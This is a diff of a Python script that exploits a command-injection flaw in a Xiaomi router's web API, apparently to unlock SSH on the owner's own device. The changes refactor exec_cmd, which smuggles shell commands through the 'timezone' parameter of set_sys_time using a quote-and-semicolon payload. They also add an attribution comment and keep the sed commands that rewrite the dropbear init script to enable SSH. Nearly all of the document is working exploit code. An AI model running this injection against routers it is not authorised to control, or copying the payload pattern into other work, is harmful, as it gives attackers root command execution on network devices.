@@ -40,23 +40,23 @@ if not info or info["code"] != 0:
     die('Cannot get init_info')
 
 ccode = info["countrycode"]
-if ccode == "CN":
-    print('Current CountryCode = CN')
+print(f'Current CountryCode = {ccode}')
 
 stok = gw.web_login()
 
-def exec_cmd(cmd = {}, api = 'misystem/set_sys_time'):
-    params = cmd
-    if isinstance(cmd, str):
-        params = { 'timezone': " ' ; " + cmd + " ; " }
-    res = requests.get(gw.apiurl + api, params = params)
-    return res.text
+
+def exec_cmd(cmd, api = 'API/misystem/set_sys_time'):
+    ######
+    # vuln/exploit author: remittor
+    # publication: https://forum.openwrt.org/t/125008/132
+    ######
+    resp = gw.api_request(api, { 'timezone': " ' ; " + cmd + " ; " })
+    return resp
 
 def get_netmode():
-    res = exec_cmd(api = 'xqnetwork/get_netmode')
-    if '"code":0' in res:
-        dp = json.loads(res)
-        return int(dp["netmode"])
+    res = gw.api_request('API/xqnetwork/get_netmode')
+    if res and res['code'] == 0:
+        return int(res["netmode"])
     return -1
 
 netmode = get_netmode()
@@ -109,7 +109,7 @@ if netmode != 4:
 
 #res = exec_cmd('logger hello_world_3335556_')
 res = exec_cmd("sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
-if '"code":0' not in res:
+if not res or res['code'] != 0:
     die('Exploit not working!!!')
   
 #res = exec_cmd("sed -i 's/`nvram get ssh_en`/1/g' /etc/init.d/dropbear")
